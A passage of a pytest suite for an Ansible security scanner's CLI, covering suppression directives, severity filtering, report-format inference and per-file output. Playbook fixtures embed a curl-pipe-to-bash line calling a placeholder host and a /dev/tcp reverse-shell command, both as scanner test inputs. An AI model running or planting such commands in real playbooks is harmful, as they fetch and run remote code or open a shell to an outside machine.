      ansible.builtin.shell: "curl http://x.example.com | bash"  # nosec: curl_pipe_to_shell reason="internal only"
""",
    )
    data = _report_as_json(_scan_playbook(playbook, show_suppressed=True))
    surfaced = [
        f
        for f in data["findings"]
        if f["line_number"] == 5 and f["rule_id"] == "curl_pipe_to_shell"
    ]
    assert surfaced, "suppressed finding should surface with --show-suppressed"
    assert surfaced[0].get("suppressed_by", "")
    assert "internal only" in surfaced[0]["suppressed_by"]


def test_suppressions_integration_invalid_directive_does_not_suppress(tmp_path):
    """An invalid suppression (missing reason) must NOT hide the finding -
    the scanner falls back to reporting it as if no directive were present."""
    playbook = _write_tmp_playbook(
        tmp_path,
        """---
- hosts: all
  tasks:
    - name: curl pipe bash with bare nosec
      ansible.builtin.shell: "curl http://x.example.com | bash"  # nosec: curl_pipe_to_shell
""",
    )
    data = _report_as_json(_scan_playbook(playbook))
    ids_on_line = {f["rule_id"] for f in data["findings"] if f["line_number"] == 5}
    assert "curl_pipe_to_shell" in ids_on_line, (
        f"invalid suppression must not silence the finding; got {ids_on_line}"
    )


def test_suppressions_integration_malicious_content_triggers_meta_finding(tmp_path):
    """A directive targeting high-risk content must (a) be rejected and
    (b) trigger the suspicious_suppression meta-finding."""
    playbook = _write_tmp_playbook(
        tmp_path,
        """---
- hosts: all
  tasks:
    - name: nope
      ansible.builtin.shell: "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"  # nosec: reverse_shell reason="pentest"
""",
    )
    data = _report_as_json(_scan_playbook(playbook, show_suppressed=True))
    rule_ids = {f["rule_id"] for f in data["findings"] if f["line_number"] == 5}
    assert "suspicious_suppression" in rule_ids, (
        f"expected suspicious_suppression meta-finding; got {rule_ids}"
    )


def test_suppressions_integration_no_suppressions_flag_disables_all(tmp_path):
    """With ``disable_suppressions=True`` (what ``--no-suppressions`` sets
    at the CLI layer), even valid directives are ignored. The argparse
    wiring from ``--no-suppressions`` -> ``disable_suppressions=True`` is
    covered by ``test_cli_no_suppressions_flag_wires_to_scanner`` below.
    """
    playbook = _write_tmp_playbook(
        tmp_path,
        """---
- hosts: all
  tasks:
    - name: curl pipe bash
      ansible.builtin.shell: "curl http://x.example.com | bash"  # nosec: curl_pipe_to_shell reason="internal only"
""",
    )
    data = _report_as_json(_scan_playbook(playbook, disable_suppressions=True))
    ids = {f["rule_id"] for f in data["findings"] if f["line_number"] == 5}
    assert "curl_pipe_to_shell" in ids, f"disable_suppressions must override directives; got {ids}"


def test_cli_severity_floor_filters_low_and_medium(tmp_path, monkeypatch, capsys):
    """``--severity HIGH`` must drop LOW/MEDIUM findings from the report
    while leaving HIGH/CRITICAL untouched. The summary counts must reflect
    the post-filter view (otherwise consumers see "found 50 issues" but
    only 5 in the rendered list, which is a confusing UX).
    """
    import json as _json

    from ansible_security_scanner import cli

    playbook = _write_tmp_playbook(
        tmp_path,
        """---
- hosts: all
  tasks:
    # HIGH: validate_certs disabled against an HTTPS endpoint
    - name: download
      ansible.builtin.uri:
        url: https://example.com/x
        validate_certs: false
    # LOW: block without rescue/always (failable task to make the
    # narrowed AST rule fire). After ``--severity HIGH`` this should
    # be filtered out of the report.
    - name: provision
      block:
        - name: install
          ansible.builtin.apt:
            name: nginx
""",
    )
    out = tmp_path / "report.json"
    monkeypatch.setattr(
        sys,
        "argv",
        [
            "ansible-security-scanner",
            "--directory",
            str(playbook.parent),
            "--files",
            str(playbook),
            "--format",
            "json",
            "--output",
            str(out),
            "--severity",
            "HIGH",
            "--exit-zero",
        ],
    )
    try:
        cli.main()
    except SystemExit:
        pass
    capsys.readouterr()

    data = _json.loads(out.read_text())
    findings = data.get("findings") or data.get("results") or []
    severities = {(f.get("severity") or "").upper() for f in findings}
    assert severities, "scan produced no findings; fixture is broken"
    assert severities.issubset({"HIGH", "CRITICAL"}), (
        f"--severity HIGH leaked sub-floor severities: {severities}"
    )


def test_cli_no_suppressions_flag_wires_to_scanner(tmp_path, monkeypatch, capsys):
    """``--no-suppressions`` on the CLI must reach
    ``AnsibleSecurityScanner(disable_suppressions=True)``. Verifies the
    argparse boolean plumbing without paying the subprocess boot cost -
    the in-process ``test_suppressions_integration_no_suppressions_flag_disables_all``
    above already verifies the semantic effect.
    """
    from ansible_security_scanner import cli

    playbook = _write_tmp_playbook(
        tmp_path,
        """---
- hosts: all
  tasks:
    - name: clean task
      ansible.builtin.debug:
        msg: hello
""",
    )
    captured: dict = {}

    real_scanner_cls = cli.AnsibleSecurityScanner

    def _capturing_scanner(*args, **kwargs):
        captured["kwargs"] = kwargs
        return real_scanner_cls(*args, **kwargs)

    monkeypatch.setattr(cli, "AnsibleSecurityScanner", _capturing_scanner)
    monkeypatch.setattr(
        sys,
        "argv",
        [
            "ansible-security-scanner",
            "--directory",
            str(playbook.parent),
            "--files",
            str(playbook),
            "--format",
            "json",
            "--no-suppressions",
        ],
    )
    try:
        cli.main()
    except SystemExit:
        pass
    capsys.readouterr()

    assert captured.get("kwargs", {}).get("disable_suppressions") is True, (
        f"--no-suppressions did not set disable_suppressions=True; got {captured.get('kwargs')}"
    )


def _run_cli_with_argv(monkeypatch, capsys, argv: list[str]) -> int:
    """Invoke ``cli.main()`` with a monkey-patched ``sys.argv`` and
    return the ``SystemExit`` code. Drains captured stdout/stderr so
    the caller can inspect only what they care about.
    """
    from ansible_security_scanner import cli

    monkeypatch.setattr(sys, "argv", argv)
    exit_code = 0
    try:
        cli.main()
    except SystemExit as e:
        exit_code = int(e.code) if e.code is not None else 0
    capsys.readouterr()
    return exit_code


# Two-rule ignore list shared across the policy-disclosure tests below.
# Keeping it module-scoped lets the tests assert against a single source
# of truth for both "what the CLI was told to ignore" and "what each
# format must surface".
_POLICY_IGNORE_RULES = ("hardcoded_password", "missing_no_log")
_POLICY_IGNORE_ARG = ",".join(_POLICY_IGNORE_RULES)


def _run_policy_scan(
    monkeypatch,
    capsys,
    *,
    tmp_path: Path,
    fmt: str,
    out_path: Path,
    ignore: str = _POLICY_IGNORE_ARG,
) -> int:
    """Run a clean-playbook scan with ``--ignore`` and write the report
    in ``fmt`` to ``out_path``. Centralises the argv shape for the
    policy-disclosure tests so they only need to assert on the format-
    specific output."""
    return _run_cli_with_argv(
        monkeypatch,
        capsys,
        [
            "ansible-security-scanner",
            "--directory",
            str(tmp_path),
            "--format",
            fmt,
            "--output",
            str(out_path),
            "--ignore",
            ignore,
        ],
    )


def _clean_playbook(tmp_path) -> Path:
    """Shared minimal clean playbook for CLI format-inference tests."""
    return _write_tmp_playbook(
        tmp_path,
        """---
- hosts: all
  tasks:
    - name: clean task
      ansible.builtin.debug:
        msg: hello
""",
    )


@pytest.mark.parametrize(
    "output_suffix,expected_format",
    [
        (".md", "markdown"),
        (".markdown", "markdown"),
        (".json", "json"),
        (".xml", "xml"),
        (".yml", "yaml"),
        (".yaml", "yaml"),
        (".csv", "csv"),
        (".html", "html"),
        (".htm", "html"),
        (".sarif", "sarif"),
    ],
)
def test_cli_output_extension_infers_format(
    tmp_path, monkeypatch, capsys, output_suffix, expected_format
):
    """``--output report.<ext>`` with no ``--format`` must infer the
    format from the extension and write a file whose contents match
    that formatter. Parametrised across every extension in the
    inference table so a silent map edit can't regress one branch
    without failing the gate.
    """
    from ansible_security_scanner import cli

    playbook = _clean_playbook(tmp_path)
    report_path = tmp_path / f"report{output_suffix}"

    captured_format: dict[str, str] = {}
    real_get_formatter = cli.get_formatter_class

    def _capturing(fmt: str):
        captured_format["fmt"] = fmt
        return real_get_formatter(fmt)

    monkeypatch.setattr(cli, "get_formatter_class", _capturing)

    exit_code = _run_cli_with_argv(
        monkeypatch,
        capsys,
        [
            "ansible-security-scanner",
            "--directory",
            str(playbook.parent),
            "--files",
            str(playbook),
            "--output",
            str(report_path),
        ],
    )

    assert exit_code == 0, f"clean scan must exit 0 (got {exit_code})"
    assert captured_format.get("fmt") == expected_format, (
        f"--output {report_path.name} expected to infer --format "
        f"{expected_format}, but scanner chose {captured_format.get('fmt')}"
    )
    assert report_path.exists(), f"inferred output file {report_path} was not written"
    # Sanity-check: whatever the inferred formatter produced must
    # actually be parseable / recognisable by that format. We don't
    # re-run the full format-validation matrix here (``test_all_output_
    # formats_valid`` already does) - just confirm the file isn't
    # empty and isn't the default Markdown banner pretending to be
    # something else.
    written = report_path.read_text()
    assert written.strip(), f"inferred output file {report_path} is empty"
    # Get the real formatter class and render in-memory so we can
    # compare shape. For sarif/json we check it parses; for markdown
    # we check it contains the banner heading.
    if expected_format in {"json", "sarif", "cyclonedx", "sbom", "gl-sast", "gitlab-sast"}:
        import json as _json

        _json.loads(written)  # must parse
    elif expected_format == "markdown":
        assert "# " in written or "## " in written, "markdown report should have headings"


def test_cli_explicit_format_beats_output_extension(tmp_path, monkeypatch, capsys, caplog):
    """When ``--format`` and ``--output`` disagree on format, the
    explicit ``--format`` wins and a warning is emitted. Silent
    renaming would hide real pipeline-configuration bugs, so we
    verify the warning is logged and the explicit formatter runs.
    """
    from ansible_security_scanner import cli

    playbook = _clean_playbook(tmp_path)
    report_path = tmp_path / "report.json"  # extension suggests JSON
    captured_format: dict[str, str] = {}
    real_get_formatter = cli.get_formatter_class

    def _capturing(fmt: str):
        captured_format["fmt"] = fmt
        return real_get_formatter(fmt)

    monkeypatch.setattr(cli, "get_formatter_class", _capturing)

    with caplog.at_level("WARNING"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--directory",
                str(playbook.parent),
                "--files",
                str(playbook),
                "--output",
                str(report_path),
                "--format",
                "sarif",  # disagrees with .json suffix
            ],
        )

    assert exit_code == 0
    assert captured_format.get("fmt") == "sarif", (
        "explicit --format sarif must win over .json extension inference"
    )
    # Warning mentions both the inferred and the explicit format.
    warning_text = "\n".join(r.message for r in caplog.records if r.levelname == "WARNING")
    assert "json" in warning_text.lower() and "sarif" in warning_text.lower(), (
        f"mismatch warning should name both formats; got:\n{warning_text}"
    )


def test_cli_refuses_to_overwrite_input_playbook(tmp_path, monkeypatch, capsys, caplog):
    """``--output <playbook>`` where the output path is one of the
    scanned ``--files`` must abort with a non-zero exit code. A
    ``.yml`` extension is a legitimate report format, so without this
    guard ``--files site.yml --output site.yml`` would silently
    overwrite the user's playbook with a YAML scan report.
    """
    playbook = _clean_playbook(tmp_path)
    with caplog.at_level("ERROR"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--directory",
                str(playbook.parent),
                "--files",
                str(playbook),
                "--output",
                str(playbook),  # deliberate collision
            ],
        )

    assert exit_code == 2, (
        f"input-overwrite guard must exit 2; got {exit_code}. "
        f"Playbook content must not be overwritten with a report."
    )
    # The playbook content must be untouched - if it were overwritten
    # as a YAML scan report, the word ``findings`` would appear.
    preserved = playbook.read_text()
    assert "clean task" in preserved, "playbook was overwritten despite the guard"
    assert "findings" not in preserved, "playbook was overwritten despite the guard"
    error_text = "\n".join(r.message for r in caplog.records if r.levelname == "ERROR")
    assert "refusing to overwrite" in error_text.lower(), (
        f"guard must log an explicit error; got:\n{error_text}"
    )


def test_cli_rejects_directory_passed_to_files(tmp_path, monkeypatch, capsys, caplog):
    """``--files`` takes file paths. Passing a directory used to be
    silently accepted and produced an empty-but-valid report, which
    reads as "no findings" to anyone glancing at the output. The CLI
    must abort with a usage error and point the user at ``--directory``.
    """
    _clean_playbook(tmp_path)
    with caplog.at_level("ERROR"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--files",
                str(tmp_path),
            ],
        )

    assert exit_code == 2, f"--files <directory> must exit 2; got {exit_code}"
    error_text = "\n".join(r.message for r in caplog.records if r.levelname == "ERROR")
    assert "expects file paths" in error_text.lower(), error_text
    assert "--directory" in error_text, error_text


def test_cli_rejects_file_passed_to_directory(tmp_path, monkeypatch, capsys, caplog):
    """The opposite mistake: ``--directory <playbook.yml>``. ``rglob``
    on a file path yields nothing, so the old behaviour was a green
    empty report. The CLI must reject up front and point the user at
    ``--files``.
    """
    playbook = _clean_playbook(tmp_path)
    with caplog.at_level("ERROR"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--directory",
                str(playbook),
            ],
        )

    assert exit_code == 2, f"--directory <file> must exit 2; got {exit_code}"
    error_text = "\n".join(r.message for r in caplog.records if r.levelname == "ERROR")
    assert "expects a directory" in error_text.lower(), error_text
    assert "--files" in error_text, error_text


def test_cli_rejects_nonexistent_directory(tmp_path, monkeypatch, capsys, caplog):
    """A typo in ``--directory`` should fail loudly rather than walk an
    empty tree and emit a clean report.
    """
    missing = tmp_path / "does-not-exist"
    with caplog.at_level("ERROR"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--directory",
                str(missing),
            ],
        )

    assert exit_code == 2, f"--directory <missing> must exit 2; got {exit_code}"
    error_text = "\n".join(r.message for r in caplog.records if r.levelname == "ERROR")
    assert "does not exist" in error_text.lower(), error_text


def test_cli_summary_discloses_active_policy_on_ignore(tmp_path, monkeypatch, capsys, caplog):
    """A clean codebase scanned with ``--ignore`` used to log
    ``Security Score: 100/100`` with no hint that the score reflected a
    truncated rule set. The stdout summary must surface the active
    policy alongside the score and the ignored-rule count.
    """
    _clean_playbook(tmp_path)
    with caplog.at_level("INFO"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--directory",
                str(tmp_path),
                "--ignore",
                _POLICY_IGNORE_ARG,
            ],
        )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    info_text = "\n".join(r.message for r in caplog.records if r.levelname == "INFO")
    assert "active policy" in info_text.lower(), (
        f"score line must carry the (active policy) qualifier; got:\n{info_text}"
    )
    assert f"{len(_POLICY_IGNORE_RULES)} rule(s) suppressed via --ignore" in info_text, (
        f"summary must report the resolved count; got:\n{info_text}"
    )


def test_json_report_carries_active_policy_rule_ids(tmp_path, monkeypatch, capsys):
    """``--ignore`` must round-trip through ``asdict`` so JSON
    consumers (CI dashboards, code-review automations) can detect
    truncated coverage without parsing log output.
    """
    _clean_playbook(tmp_path)
    out_path = tmp_path / "report.json"
    exit_code = _run_policy_scan(
        monkeypatch, capsys, tmp_path=tmp_path, fmt="json", out_path=out_path
    )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    data = json.loads(out_path.read_text())
    assert "ignored_rule_ids" in data, list(data.keys())
    assert sorted(data["ignored_rule_ids"]) == sorted(_POLICY_IGNORE_RULES)
    assert data.get("selected_rule_ids", []) == [], data.get("selected_rule_ids")


def test_markdown_report_renders_active_policy_section(tmp_path, monkeypatch, capsys):
    """The Markdown report must surface the policy disclosure both as
    an inline qualifier on the Security Score row and as a dedicated
    section listing the affected rule IDs.
    """
    _clean_playbook(tmp_path)
    out_path = tmp_path / "report.md"
    exit_code = _run_policy_scan(
        monkeypatch, capsys, tmp_path=tmp_path, fmt="markdown", out_path=out_path
    )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    md = out_path.read_text()
    assert "*(active policy)*" in md, md
    assert "### Active Scan Policy" in md, md
    for rid in _POLICY_IGNORE_RULES:
        assert f"`{rid}`" in md, md


def test_sarif_report_carries_active_policy_in_tool_driver(tmp_path, monkeypatch, capsys):
    """SARIF consumers (GitHub code-scanning, generic viewers) must be
    able to tell a 100% run was constrained by ``--ignore``. The
    canonical slot for scanner-level metadata is
    ``runs[0].tool.driver.properties``.
    """
    _clean_playbook(tmp_path)
    out_path = tmp_path / "report.sarif"
    exit_code = _run_policy_scan(
        monkeypatch, capsys, tmp_path=tmp_path, fmt="sarif", out_path=out_path
    )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    data = json.loads(out_path.read_text())
    driver = data["runs"][0]["tool"]["driver"]
    assert "properties" in driver, driver
    policy = driver["properties"].get("activePolicy")
    assert policy is not None, driver["properties"]
    assert sorted(policy["ignoredRuleIds"]) == sorted(_POLICY_IGNORE_RULES)
    assert policy["selectedRuleIds"] == []


def test_sarif_report_omits_active_policy_for_default_run(tmp_path, monkeypatch, capsys):
    """A scan with no ``--select``/``--ignore`` must leave the SARIF
    shape unchanged so existing CI ingestion paths keep validating.
    """
    _clean_playbook(tmp_path)
    out_path = tmp_path / "report.sarif"
    exit_code = _run_cli_with_argv(
        monkeypatch,
        capsys,
        [
            "ansible-security-scanner",
            "--directory",
            str(tmp_path),
            "--format",
            "sarif",
            "--output",
            str(out_path),
        ],
    )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    data = json.loads(out_path.read_text())
    driver = data["runs"][0]["tool"]["driver"]
    assert "properties" not in driver or "activePolicy" not in driver.get("properties", {}), driver


def test_gitlab_sast_report_carries_active_policy_in_scan_options(tmp_path, monkeypatch, capsys):
    """GitLab's MR security widget reads ``scan.options`` for pipeline
    metadata. Surfacing the active policy there lets reviewers see
    that a clean SAST report was produced under a constrained rule
    set rather than against the full catalog.
    """
    _clean_playbook(tmp_path)
    out_path = tmp_path / "gl-sast-report.json"
    exit_code = _run_policy_scan(
        monkeypatch, capsys, tmp_path=tmp_path, fmt="gitlab-sast", out_path=out_path
    )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    data = json.loads(out_path.read_text())
    options = data["scan"].get("options")
    assert options is not None, data["scan"]
    policy = options.get("active_policy")
    assert policy is not None, options
    assert sorted(policy["ignored_rule_ids"]) == sorted(_POLICY_IGNORE_RULES)
    assert policy["selected_rule_ids"] == []


def test_yaml_report_carries_active_policy_rule_ids(tmp_path, monkeypatch, capsys):
    """YAML rides the same ``asdict(report)`` path as JSON, so the
    policy fields must appear at the top level. Locks in the contract
    so a future formatter rewrite doesn't silently drop them.
    """
    _clean_playbook(tmp_path)
    out_path = tmp_path / "report.yaml"
    exit_code = _run_policy_scan(
        monkeypatch, capsys, tmp_path=tmp_path, fmt="yaml", out_path=out_path
    )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    data = yaml.safe_load(out_path.read_text())
    assert sorted(data["ignored_rule_ids"]) == sorted(_POLICY_IGNORE_RULES)
    assert data["selected_rule_ids"] == []


def test_junit_report_surfaces_active_policy_in_properties(tmp_path, monkeypatch, capsys):
    """CI test dashboards (Jenkins, GitLab CI, GitHub Actions) read
    ``<properties>`` for suite-level metadata. The active policy must
    surface there so a clean JUnit report can't masquerade as a
    full-coverage clean run.
    """
    _clean_playbook(tmp_path)
    out_path = tmp_path / "junit.xml"
    exit_code = _run_policy_scan(
        monkeypatch, capsys, tmp_path=tmp_path, fmt="junit", out_path=out_path
    )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    root = ET.fromstring(out_path.read_text())
    props: dict[str, str] = {
        name: value
        for p in root.findall("./properties/property")
        if (name := p.get("name")) and (value := p.get("value")) is not None
    }
    assert "ansible-security-scanner.ignored_rule_ids" in props, props
    assert sorted(props["ansible-security-scanner.ignored_rule_ids"].split(",")) == sorted(
        _POLICY_IGNORE_RULES
    )
    assert "ansible-security-scanner.selected_rule_ids" not in props, props


def test_junit_report_omits_active_policy_for_default_run(tmp_path, monkeypatch, capsys):
    """A scan with no ``--select``/``--ignore`` must keep the JUnit
    output byte-stable so existing CI dashboards (which fingerprint
    test reports) don't see spurious diffs on every run.
    """
    _clean_playbook(tmp_path)
    out_path = tmp_path / "junit.xml"
    exit_code = _run_cli_with_argv(
        monkeypatch,
        capsys,
        [
            "ansible-security-scanner",
            "--directory",
            str(tmp_path),
            "--format",
            "junit",
            "--output",
            str(out_path),
        ],
    )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    root = ET.fromstring(out_path.read_text())
    assert root.find("./properties") is None, ET.tostring(root, encoding="unicode")


def test_cyclonedx_report_carries_active_policy_in_metadata_properties(
    tmp_path, monkeypatch, capsys
):
    """CycloneDX's ``vulnerabilities[]`` is gated by ``--select`` /
    ``--ignore``, so a Dependency-Track-style consumer must be able to
    detect a constrained run. ``metadata.properties[]`` is the
    documented slot for arbitrary scanner metadata.
    """
    _clean_playbook(tmp_path)
    out_path = tmp_path / "bom.json"
    exit_code = _run_policy_scan(
        monkeypatch, capsys, tmp_path=tmp_path, fmt="cyclonedx", out_path=out_path
    )

    assert exit_code == 0, f"clean scan must exit 0; got {exit_code}"
    data = json.loads(out_path.read_text())
    props = {p["name"]: p["value"] for p in data["metadata"].get("properties", [])}
    assert "ansible-security-scanner:ignored_rule_ids" in props, props
    assert sorted(props["ansible-security-scanner:ignored_rule_ids"].split(",")) == sorted(
        _POLICY_IGNORE_RULES
    )
    assert "ansible-security-scanner:selected_rule_ids" not in props, props


def test_cli_unknown_extension_warns_and_defaults_to_markdown(
    tmp_path, monkeypatch, capsys, caplog
):
    """``--output report.xyz`` with no ``--format`` and an unknown
    extension should default to Markdown and emit a warning so the
    user knows Markdown bytes are about to land in a file with the
    wrong suffix.
    """
    from ansible_security_scanner import cli

    playbook = _clean_playbook(tmp_path)
    report_path = tmp_path / "report.unknownext"
    captured_format: dict[str, str] = {}
    real_get_formatter = cli.get_formatter_class

    def _capturing(fmt: str):
        captured_format["fmt"] = fmt
        return real_get_formatter(fmt)

    monkeypatch.setattr(cli, "get_formatter_class", _capturing)

    with caplog.at_level("WARNING"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--directory",
                str(playbook.parent),
                "--files",
                str(playbook),
                "--output",
                str(report_path),
            ],
        )

    assert exit_code == 0
    assert captured_format.get("fmt") == "markdown", "unknown extension must fall back to markdown"
    warning_text = "\n".join(r.message for r in caplog.records if r.levelname == "WARNING")
    assert "unknownext" in warning_text or "recognised extension" in warning_text.lower(), (
        f"unknown-extension warning missing; got:\n{warning_text}"
    )


def test_cli_no_output_preserves_historical_default(tmp_path, monkeypatch, capsys):
    """Invoking the CLI with neither ``--output`` nor ``--format``
    must still default to Markdown and write to stdout - the
    historical behaviour that existing pipelines depend on.
    """
    from ansible_security_scanner import cli

    playbook = _clean_playbook(tmp_path)
    captured_format: dict[str, str] = {}
    real_get_formatter = cli.get_formatter_class

    def _capturing(fmt: str):
        captured_format["fmt"] = fmt
        return real_get_formatter(fmt)

    monkeypatch.setattr(cli, "get_formatter_class", _capturing)

    exit_code = _run_cli_with_argv(
        monkeypatch,
        capsys,
        [
            "ansible-security-scanner",
            "--directory",
            str(playbook.parent),
            "--files",
            str(playbook),
        ],
    )

    assert exit_code == 0
    assert captured_format.get("fmt") == "markdown", (
        "no --output and no --format must still default to markdown"
    )


_MULTI_BAD_FIXTURE = Path(__file__).parent / "playbooks" / "multi_example_bad"
_MULTI_BAD_SCAN_FILES = [
    str(_MULTI_BAD_FIXTURE / "site.yml"),
    str(_MULTI_BAD_FIXTURE / "roles" / "webapp" / "meta" / "main.yml"),
    str(_MULTI_BAD_FIXTURE / "roles" / "webapp" / "defaults" / "main.yml"),
    str(_MULTI_BAD_FIXTURE / "roles" / "webapp" / "tasks" / "main.yml"),
    str(_MULTI_BAD_FIXTURE / "roles" / "webapp" / "tasks" / "install.yml"),
    str(_MULTI_BAD_FIXTURE / "roles" / "webapp" / "tasks" / "harden.yml"),
]


def test_cli_output_per_file_writes_one_file_per_scanned_yaml(tmp_path, monkeypatch, capsys):
    """With ``--output-per-file`` the scanner must emit exactly one
    report per scanned YAML file - not the aggregate blob, not
    duplicates from path-normalisation differences between the scan
    directory and CLI-provided ``--files`` paths.
    """
    out_dir = tmp_path / "per-file-reports"

    exit_code = _run_cli_with_argv(
        monkeypatch,
        capsys,
        [
            "ansible-security-scanner",
            "--directory",
            str(_MULTI_BAD_FIXTURE),
            "--files",
            *_MULTI_BAD_SCAN_FILES,
            "--output",
            str(out_dir),
            "--output-per-file",
            "--format",
            "markdown",
            "--exit-zero",
        ],
    )

    assert exit_code == 0, f"per-file scan must exit 0 with --exit-zero; got {exit_code}"
    assert out_dir.is_dir(), "--output-per-file must create the output directory"

    written = sorted(p for p in out_dir.rglob("*.md") if p.is_file())
    assert len(written) == len(_MULTI_BAD_SCAN_FILES), (
        f"expected 1 report per scanned file ({len(_MULTI_BAD_SCAN_FILES)}), "
        f"got {len(written)}: {[str(p.relative_to(out_dir)) for p in written]}"
    )

    # Every report must be non-empty, carry a Markdown heading, and
    # cite only its own file - a report that accidentally dumps the
    # aggregate blob would reference every scanned file.
    for report_path in written:
        content = report_path.read_text()
        assert content.strip(), f"{report_path} is empty"
        assert "# " in content or "## " in content, (
            f"{report_path} missing Markdown heading - formatter likely broken"
        )


def test_cli_output_per_file_smart_defaults_to_security_reports(
    tmp_path, monkeypatch, capsys, caplog
):
    """``--output-per-file`` without an explicit ``--output`` should
    not error - it should default to writing reports under
    ``./security-reports/`` so the common case ("give me one report
    per file") works without boilerplate. The default directory name
    is intentionally self-documenting.
    """
    from ansible_security_scanner.cli import _DEFAULT_OUTPUT_PER_FILE_DIR

    playbook = _clean_playbook(tmp_path)
    # Run in a tmp CWD so we don't scatter files into the repo.
    monkeypatch.chdir(tmp_path)

    with caplog.at_level("INFO"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--directory",
                str(playbook.parent),
                "--files",
                str(playbook),
                "--output-per-file",
                "--exit-zero",
                "--verbose",
            ],
        )

    assert exit_code == 0, (
        f"--output-per-file with no --output should succeed via smart "
        f"default; got exit code {exit_code}"
    )
    default_dir = tmp_path / _DEFAULT_OUTPUT_PER_FILE_DIR
    assert default_dir.is_dir(), (
        f"smart default should create {_DEFAULT_OUTPUT_PER_FILE_DIR}/ under cwd; directory missing"
    )
    written = list(default_dir.rglob("*.md"))
    assert len(written) == 1, f"expected 1 report in the default directory; got {len(written)}"
    # An info-level log must mention the smart default so operators
    # can see where reports landed.
    info_text = "\n".join(r.message for r in caplog.records if r.levelname == "INFO")
    assert _DEFAULT_OUTPUT_PER_FILE_DIR in info_text, (
        f"smart-default log message missing; got:\n{info_text}"
    )


def test_cli_output_per_file_rejects_existing_file_at_output_path(
    tmp_path, monkeypatch, capsys, caplog
):
    """If ``--output`` already exists as a regular file,
    ``--output-per-file`` must refuse rather than silently failing
    on the first per-file write. Protects users who pipe one mode's
    artifact into the other (``--output report.md --output-per-file``).
    """
    playbook = _clean_playbook(tmp_path)
    existing = tmp_path / "report.md"
    existing.write_text("pre-existing content")

    with caplog.at_level("ERROR"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--directory",
                str(playbook.parent),
                "--files",
                str(playbook),
                "--output",
                str(existing),
                "--output-per-file",
            ],
        )

    assert exit_code == 2
    assert existing.read_text() == "pre-existing content", (
        "the pre-existing file must not be touched"
    )
    error_text = "\n".join(r.message for r in caplog.records if r.levelname == "ERROR")
    assert "directory" in error_text.lower(), (
        f"error should mention directory requirement; got:\n{error_text}"
    )


def test_cli_output_per_file_rejects_aggregate_only_format(tmp_path, monkeypatch, capsys, caplog):
    """SBOM / CycloneDX reports describe the scan as a whole - there's
    no sensible per-file split. Must refuse early so the scan isn't
    wasted.
    """
    playbook = _clean_playbook(tmp_path)
    out_dir = tmp_path / "out"

    with caplog.at_level("ERROR"):
        exit_code = _run_cli_with_argv(
            monkeypatch,
            capsys,
            [
                "ansible-security-scanner",
                "--directory",
                str(playbook.parent),
                "--files",
                str(playbook),
                "--output",
                str(out_dir),
                "--output-per-file",
                "--format",
                "cyclonedx",
            ],
        )

    assert exit_code == 2
    assert not out_dir.exists() or not any(out_dir.rglob("*")), (
        "no reports should be written for an aggregate-only format"
    )
    error_text = "\n".join(r.message for r in caplog.records if r.levelname == "ERROR")
    assert "cyclonedx" in error_text.lower(), (
        f"error should name the offending format; got:\n{error_text}"
    )


def test_cli_output_per_file_emits_empty_report_for_clean_files(tmp_path, monkeypatch, capsys):
    """A scanned file with zero findings still gets its own report -
    CI systems that iterate ``output_dir/*`` must see every input
    mapped to an output. Otherwise ``clean.yml`` would silently
    produce no file and a consumer can't distinguish "clean" from
    "scan skipped".
    """
    playbook = _clean_playbook(tmp_path)
    out_dir = tmp_path / "per-file-clean"

    exit_code = _run_cli_with_argv(
        monkeypatch,
        capsys,
        [
            "ansible-security-scanner",
            "--directory",
            str(playbook.parent),
            "--files",
            str(playbook),
            "--output",
            str(out_dir),
            "--output-per-file",
            "--format",
            "markdown",
            "--exit-zero",
        ],
    )

    assert exit_code == 0
    written = list(out_dir.rglob("*.md"))
    assert len(written) == 1, (
        f"clean scan with 1 input must still produce 1 report; got {len(written)}"
    )
    # The rendered report exists and is non-trivial even for a clean file.
    assert written[0].read_text().strip()


def test_cli_output_per_file_format_drives_extension(tmp_path, monkeypatch, capsys):
    """Per-file report suffix must follow ``--format``, not the
    input file's ``.yml`` extension. A Markdown scan of ``site.yml``
    should produce ``site.yml.md``, not ``site.yml``.
    """
    playbook = _clean_playbook(tmp_path)
    out_dir = tmp_path / "per-file-ext"

    exit_code = _run_cli_with_argv(
        monkeypatch,
        capsys,
        [
            "ansible-security-scanner",
            "--directory",
            str(playbook.parent),
            "--files",
            str(playbook),
            "--output",
            str(out_dir),
            "--output-per-file",
            "--format",
            "json",
            "--exit-zero",
        ],
    )

    assert exit_code == 0
    jsons = list(out_dir.rglob("*.json"))
    assert len(jsons) == 1, f"expected 1 .json report; got {[str(p) for p in jsons]}"
    # And the produced file must actually be valid JSON.
    json.loads(jsons[0].read_text())


def test_cli_help_epilog_contains_runnable_examples(monkeypatch, capsys):
    """``--help`` must surface concrete example invocations so a new
    user can copy-paste one line and get a working scan. Regression
    for the help-epilog feature: without explicit examples, new users
    had to read the README to figure out how to render SARIF / SBOM /
    GitLab-SAST reports.
    """
    from ansible_security_scanner import cli

